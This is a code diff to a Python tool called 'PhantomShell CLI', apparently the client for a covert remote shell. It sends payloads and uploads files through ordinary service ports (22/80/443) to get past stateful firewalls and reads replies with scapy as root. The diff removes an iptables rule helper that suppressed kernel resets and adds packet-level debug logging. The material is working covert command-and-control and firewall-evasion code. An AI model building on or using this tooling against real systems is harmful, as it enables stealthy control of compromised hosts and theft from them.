@@ -1,11 +1,8 @@
 import argparse
-import atexit
 import base64
 import os
 import random
-import signal
 import socket
-import subprocess
 import sys
 import threading
 import time
@@ -119,45 +116,7 @@ def _load_scapy():
 
 
 # ---------------------------------------------------------------------------
-# iptables helper: block kernel from seeing reply packets (prevents RST)
-# ---------------------------------------------------------------------------
-
-_active_ipt_rules = set()
-
-
-def _ipt_cleanup():
-    if not _active_ipt_rules:
-        return
-    print(f"\n[!] Cleaning up {len(_active_ipt_rules)} iptables rule(s)", file=sys.stderr)
-    for target, port, local_port in list(_active_ipt_rules):
-        _ipt_undrop_input(target, port, local_port)
-
-
-atexit.register(_ipt_cleanup)
-
-
-def _ipt_drop_input(target, port, local_port):
-    _active_ipt_rules.add((target, port, local_port))
-    cmd = ["iptables", "-I", "INPUT", "1",
-           "-p", "tcp", "-s", target,
-           "--sport", str(port), "--dport", str(local_port),
-           "-j", "DROP"]
-    dbg(f"iptables DROP: {' '.join(cmd)}")
-    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-
-def _ipt_undrop_input(target, port, local_port):
-    _active_ipt_rules.discard((target, port, local_port))
-    cmd = ["iptables", "-D", "INPUT",
-           "-p", "tcp", "-s", target,
-           "--sport", str(port), "--dport", str(local_port),
-           "-j", "DROP"]
-    dbg(f"iptables UNDROP: {' '.join(cmd)}")
-    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-
-# ---------------------------------------------------------------------------
-# Sniff TCP replies via scapy (captures at L2, bypasses kernel iptables DROP)
+# Sniff TCP replies via scapy (captures at L2)
 # ---------------------------------------------------------------------------
 
 def _get_iface_for_target(target):
@@ -225,12 +184,15 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
         for pkt in packets:
             raw = _tcp_payload(pkt)
             if raw:
+                dbg(f"sniff: pkt {len(raw)}B hex={raw.hex()}")
+                dbg(f"sniff: pkt {len(raw)}B repr={raw[:80]}")
                 if tok:
                     parts = raw.split(tok)
                     if len(parts) < 2:
-                        dbg(f"sniff: skip non-token: {raw[:40]}")
+                        dbg(f"sniff: skip non-token ({len(parts)} parts)")
                         continue
                     matched = True
+                    dbg(f"sniff: split into {len(parts)} parts: {[len(p) for p in parts]}")
                     for part in parts[1:]:
                         if part:
                             chunks.append(part)
@@ -277,8 +239,6 @@ def tcp_connect_send(target, port, payload, timeout=3, token=None):
         dbg(f"tcp_connect: failed: {e}")
         raise ConnectError(str(e))
 
-    _ipt_drop_input(target, port, local_port)
-
     try:
         sniff_result = [b""]
         sniff_ready = threading.Event()
@@ -297,7 +257,6 @@ def tcp_connect_send(target, port, payload, timeout=3, token=None):
         output = sniff_result[0]
         dbg(f"tcp_connect: sniff returned {len(output) if output else 0} bytes")
     finally:
-        _ipt_undrop_input(target, port, local_port)
         tcp_sock.close()
 
     # token mode: b"" is valid (empty output), None means no token match
@@ -425,16 +384,8 @@ def tcp_upload(target, port, local_path, remote_path, timeout=10):
 # ---------------------------------------------------------------------------
 
 def main():
-    def _sig_cleanup(signum, frame):
-        _ipt_cleanup()
-        signal.signal(signum, signal.SIG_DFL)
-        os.kill(os.getpid(), signum)
-
-    signal.signal(signal.SIGINT, _sig_cleanup)
-    signal.signal(signal.SIGTERM, _sig_cleanup)
-
     parser = argparse.ArgumentParser(
-        description="phantomshell CLI - unified UDP/TCP client",
+        description="PhantomShell CLI - unified UDP/TCP client",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 TCP mode uses a real TCP connect to a service port (22/80/443 etc.) to pass
@@ -484,7 +435,7 @@ stateful firewalls. Reply is sniffed via scapy (requires root).
 
     if use_tcp:
         if os.geteuid() != 0:
-            print("[-] TCP mode requires root (scapy sniff + iptables).", file=sys.stderr)
+            print("[-] TCP mode requires root (scapy sniff).", file=sys.stderr)
             sys.exit(1)
         if _load_scapy() is None:
             print("[-] scapy is required for TCP mode but is not installed.", file=sys.stderr)
